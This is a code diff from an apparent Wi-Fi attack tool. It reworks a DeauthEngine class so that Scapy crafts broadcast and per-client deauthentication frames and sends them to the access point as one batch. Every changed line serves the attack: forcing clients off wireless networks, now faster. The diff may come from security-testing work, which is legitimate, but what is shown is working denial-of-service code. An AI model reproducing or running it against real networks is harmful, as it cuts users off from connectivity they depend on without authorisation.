@@ -137,30 +137,33 @@ class DeauthEngine:
                                 except Exception as e:
                                     log.debug(f"Deauth verify callback error: {e}")
                     else:
-                        # ── Scapy fallback path ──
+                        # ── Scapy fallback path (batched) ──
+                        # Collect all frames for this cycle then send as batch
+                        batch_frames = []
+
                         # Broadcast deauth (hits all clients)
-                        for frame in self._craft_deauth(bssid, WIFI_BROADCAST, bssid):
-                            try:
-                                sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
-                                      inter=0.02, verbose=False)
-                            except Exception as e:
-                                log.error(f"Deauth send failed for {bssid}: {e}")
+                        batch_frames.extend(
+                            self._craft_deauth(bssid, WIFI_BROADCAST, bssid))
+
                         # Per-client targeted deauth (3-way)
                         for client_mac in list(clients):
-                            for frame in self._craft_deauth(bssid, client_mac, bssid):
-                                try:
-                                    sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
-                                          inter=0.02, verbose=False)
-                                except Exception as e:
-                                    log.error(f"Deauth send failed for {client_mac}: {e}")
-                            for frame in self._craft_deauth(client_mac, bssid, bssid):
-                                try:
-                                    sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
-                                          inter=0.02, verbose=False)
-                                except Exception as e:
-                                    log.error(f"Deauth send failed for {client_mac} -> AP: {e}")
-                            # Optionally verify deauth effectiveness
-                            if self.verify_callback:
+                            batch_frames.extend(
+                                self._craft_deauth(bssid, client_mac, bssid))
+                            batch_frames.extend(
+                                self._craft_deauth(client_mac, bssid, bssid))
+
+                        # Send entire batch at once
+                        if batch_frames:
+                            try:
+                                sendp(batch_frames, iface=self.interface,
+                                      count=DEAUTH_BURST_COUNT, inter=0.02,
+                                      verbose=False)
+                            except Exception as e:
+                                log.error(f"Deauth batch send failed for {bssid}: {e}")
+
+                        # Run verify callbacks after the batch
+                        if self.verify_callback:
+                            for client_mac in list(clients):
                                 try:
                                     self.verify_callback(bssid, client_mac)
                                 except Exception as e:
